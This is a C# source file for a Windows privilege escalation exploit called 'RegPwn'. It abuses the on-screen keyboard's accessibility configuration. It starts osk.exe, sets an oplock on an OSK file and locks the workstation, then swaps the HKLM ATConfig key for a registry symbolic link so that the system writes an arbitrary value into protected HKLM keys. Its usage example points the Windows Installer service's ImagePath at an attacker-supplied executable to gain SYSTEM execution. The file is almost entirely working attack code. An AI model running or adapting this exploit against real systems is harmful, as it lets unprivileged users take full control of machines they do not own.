using System;
using System.Runtime.InteropServices;
using System.Threading;
using static RegPwn.WindowsApi;
using NtApiDotNet;
using System.Security.AccessControl;
using Microsoft.Win32;
using System.IO;
namespace RegPwn
{
    public class Program
    {
       

        static void Main(string[] args)
        {
            if (args.Length == 0)
            {
                Usage();
                return;
            }
            if (!ParseArgs(args))
            {
                Usage();
                return;
            }
            Console.WriteLine("[*] Arguments parsed successfully.");
            string oldval = CheckRegValue(Config.regKey, Config.regValueName);
            if(oldval == "Registry key does not exist.")
            {
                Console.WriteLine("[-] Target registry key do not exist.");
                return;
            }
            Console.WriteLine("[*] Old registry value: {0}", oldval);
            // Get HKLM path to ATConfig
            String hklmPath = GetPath();
            if(String.IsNullOrEmpty(hklmPath))
            {
                return;
            }
            
            
            Console.WriteLine(@"[+] ATConfig path: {0}", hklmPath);

            // Start hidden osk process
            if(!StartOsk())
            {
                return;
            }
            
            // Add registry value
            if(!AddRegValue())
            {
                return;
            }
            NtFile hfile = NtFile.Open(@"\??\C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml", null, FileAccessRights.GenericRead, FileShareMode.Write | FileShareMode.Delete, FileOpenOptions.None);
            var oplock = hfile.OplockExclusiveAsync();
            bool wksLocked = false;
            bool oplocktriggerd = false;
            while(!oplocktriggerd)
            {
                if(wksLocked == false)
                {
                    wksLocked = true;
                    LockWorkStation();
                }
                Thread.Sleep(500);
                if(oplock.IsCompleted)
                {
                    Console.WriteLine("[+] Oplock triggered.");
                    if (RegDeleteKey(HKEY_LOCAL_MACHINE, hklmPath) != 0x0)
                    {
                        Console.WriteLine("[-] RegDeleteKey failed: {0}", Marshal.GetLastWin32Error());
                        return;
                    }
                    byte[] data = System.Text.Encoding.Unicode.GetBytes(@"\Registry\Machine\" + Config.regKey.Substring(5));
                    IntPtr hKey;
                    RegistryDispositionValue disposition;
                    if (RegCreateKeyExW(HKEY_LOCAL_MACHINE, hklmPath, 0, null, REG_OPTION_CREATE_LINK | REG_OPTION_VOLATILE, KEY_WRITE, IntPtr.Zero, out hKey, out disposition) != 0x0)
                    {
                        Console.WriteLine("[-] RegCreateKeyExW failed: {0}", Marshal.GetLastWin32Error());
                        return;
                    }


                    if (RegSetValueExW(hKey, "SymbolicLinkValue", 0, REG_LINK, data, (uint)data.Length) != 0x0)
	{
                        Console.WriteLine("[-] RegSetValueExW failed: {0}", Marshal.GetLastWin32Error());
                        return;
                    }
                    Console.WriteLine("[+] Symlink created.");
                    RegCloseKey(hKey);

                    hfile.AcknowledgeOplock(OplockAcknowledgeLevel.No2);
                    oplocktriggerd = true;

                }
            }

            Thread.Sleep(5000);
            IntPtr hKey2;
            RegOpenKeyEx(HKEY_LOCAL_MACHINE, hklmPath, REG_OPTION_OPEN_LINK, DELETE, out hKey2);
            uint result = NtDeleteKey(hKey2);
            if (result == 0)
            {
                Console.WriteLine("[+] Symlink deleted.");
            }
            RegCloseKey(hKey2);
            string newval = CheckRegValue(Config.regKey, Config.regValueName);
            if(newval == oldval)
            {
                Console.WriteLine("[-] Exploit failed. Registry value: {0}", newval);
                return;
            }
            Console.WriteLine("[+] Exploit successful. New registry value: {0}", newval);

        }
        public static void Usage()
        {
            Console.WriteLine(@"[*] Usage: RegPwn.exe --regKey <reg key> --regValueName <reg value name> --regValueData <reg data> --regValueType <reg value type>");
            Console.WriteLine(@"[*] Example RegPwn.exe --regKey HKLM\SYSTEM\ControlSet001\Services\msiserver --regValueName ImagePath --regValueData C:\Programdata\serivce.exe --regValueType REG_EXPAND_SZ");
        }
        public static bool ParseArgs(string[] args)
        {
            int iter = 0;
            foreach (string item in args)
            {
                switch (item)
                {
                    case "--regKey":
                        Config.regKey = args[iter + 1];
                        break;
                    case "--regValueData":
                        Config.regValueData = args[iter + 1];
                        break;
                    case "--regValueName":
                        Config.regValueName = args[iter + 1];
                        break;
                    case "--regValueType":
                        Config.regValueType = args[iter + 1];
                        break;
                    default:
                        break;
                }

                ++iter;
            }
            if (String.IsNullOrEmpty(Config.regValueName) || String.IsNullOrEmpty(Config.regKey) || String.IsNullOrEmpty(Config.regValueData) || String.IsNullOrEmpty(Config.regValueType))
            {
                return false;
            }
            return true;


        }
       
        public static string GetPath()
        {
            IntPtr tokenHandle = new IntPtr(-4);
            int tokenInfoLength = Marshal.SizeOf(typeof(uint));
            IntPtr tokenInfo = Marshal.AllocHGlobal(tokenInfoLength);

            try
            {
                if (GetTokenInformation(tokenHandle, WindowsApi.TokenSessionId, tokenInfo, tokenInfoLength, out _))
                {
                    uint sessionId = Marshal.PtrToStructure<uint>(tokenInfo);
                    return String.Format(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session{0}\ATConfig\osk",sessionId);
                }
                else
                {
                    Console.WriteLine("Failed to get token session ID. Error: " + Marshal.GetLastWin32Error());
                }
            }
            finally
            {
                Marshal.FreeHGlobal(tokenInfo);
            }

            return null;
        }


public static bool StartOsk()
{
    IntPtr ptr = IntPtr.Zero;
    try
    {
        // 1. 尝试禁用 WoW64 文件系统重定向，这是最可靠的路径访问方式
        bool isRedirected = false;
        if (Environment.Is64BitOperatingSystem && !Environment.Is64BitProcess)
        {
            isRedirected = WindowsApi.Wow64DisableWow64FsRedirection(ref ptr);
        }

        // 2. 动态构建路径：始终指向真正的 System32
        // 在 64位系统上，如果禁用了重定向，System32 就是真正的 System32
        string windir = Environment.GetFolderPath(Environment.SpecialFolder.Windows);
        string oskPath = Path.Combine(windir, "System32", "osk.exe");

        // 兜底方案：如果禁用失败，尝试使用 Sysnative
        if (!File.Exists(oskPath))
        {
            oskPath = Path.Combine(windir, "Sysnative", "osk.exe");
        }

        var shExInfo = new WindowsApi.SHELLEXECUTEINFO
        {
            cbSize = Marshal.SizeOf(typeof(WindowsApi.SHELLEXECUTEINFO)),
            // SEE_MASK_NOCLOSEPROCESS (0x40) 以获取 hProcess
            // SEE_MASK_FLAG_NO_UI (0x400) 避免弹出系统错误弹窗
            fMask = 0x00000040 | 0x00000400,
            hwnd = IntPtr.Zero,
            lpFile = oskPath,
            lpParameters = null,
            lpDirectory = null,
            nShow = 5, // SW_SHOW: 既然要执行OSK，必须显示出来，nShow=0可能导致进程启动后立即退出
            hInstApp = IntPtr.Zero
        };

        Console.WriteLine($"[*] Attempting to start: {oskPath}");

        if (WindowsApi.ShellExecuteEx(ref shExInfo))
        {
            Console.WriteLine("[+] Process created successfully.");
            
            // OSK 有时会由父进程代理启动后立即退出主进程，产生一个子进程
            // 这里的 Sleep 5秒建议保留，确保 OSK 界面加载完毕
            Thread.Sleep(5000);

            if (shExInfo.hProcess != IntPtr.Zero)
            {
                WindowsApi.CloseHandle(shExInfo.hProcess);
            }
            return true;
        }
        else
        {
            int errorCode = Marshal.GetLastWin32Error();
            Console.WriteLine($"[-] ShellExecuteEx failed with error code: {errorCode}");
            return false;
        }
    }
    catch (Exception ex)
    {
        Console.WriteLine($"[-] Exception: {ex.Message}");
        return false;
    }
    finally
    {
        // 3. 必须恢复重定向，否则后续的系统库加载可能崩溃
        if (ptr != IntPtr.Zero)
        {
            WindowsApi.Wow64RevertWow64FsRedirection(ptr);
        }
    }
}
		
        public static bool AddRegValue()
        {
            IntPtr hKey;
            RegistryDispositionValue iDisposition;
            if (RegCreateKeyExW(HKEY_CURRENT_USER, @"Software\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\osk", 0,null, 0, KEY_WRITE, IntPtr.Zero,out hKey, out iDisposition) != 0x0)
            {
                Console.WriteLine("[-] RegCreateKeyExW failed: {0}.", Marshal.GetLastWin32Error());
                return false;
            }
            byte[] data = System.Text.Encoding.Unicode.GetBytes(Config.regValueData);
            if (RegSetValueExW(hKey, Config.regValueName, 0, REG_EXPAND_SZ, data, (uint)data.Length) != 0x0)
	{
                Console.WriteLine("[-] RegSetValueExW failed: {0}.", Marshal.GetLastWin32Error());
                return false;
            }
            RegCloseKey(hKey);
            Console.WriteLine("[+] Registry value added.");
            return true;

          
        }
        public static string CheckRegValue(string keyPath, string valueName)
        {
            {
                try
                {
                    using (RegistryKey key = Registry.LocalMachine.OpenSubKey(keyPath.Substring(5)))
                    {
                        if (key == null)
                        {
                            return "Registry key does not exist.";
                        }

                        object value = key.GetValue(valueName);

                        if (value == null)
                        {
                            return "Value Don't Exist";
                        }

                        if (string.IsNullOrEmpty(value.ToString()))
                        {
                            return "Value Empty";
                        }


                        return value.ToString();
                    }
                }
                catch (Exception ex)
                {
                    return $"Error: {ex.Message}";
                }
            }
        }
    }
}
